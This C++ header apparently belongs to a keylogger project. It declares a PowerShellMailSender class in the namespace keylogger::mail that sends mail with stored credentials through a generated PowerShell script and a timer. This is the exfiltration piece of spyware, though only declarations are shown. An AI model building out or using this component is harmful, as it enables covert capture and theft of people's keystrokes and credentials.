#pragma once

#include <Windows.h>
#include <fstream>
#include <iostream>
#include <vector>

#include "DefaultFileSystemAccess.h"
#include "PowerShellSendMailScriptCreator.h"
#include "Helper.h"
#include "Timer.h"
#include "MailSender.h"

namespace keylogger::mail
{
class PowerShellMailSender : public MailSender
{
public:
    PowerShellMailSender(std::unique_ptr<PowerShellSendMailScriptCreator>);

    bool sendMail(const Mail&, const Credentials&) override;

private:
    Timer timer;
    std::unique_ptr<PowerShellSendMailScriptCreator> scriptCreator;
};
}
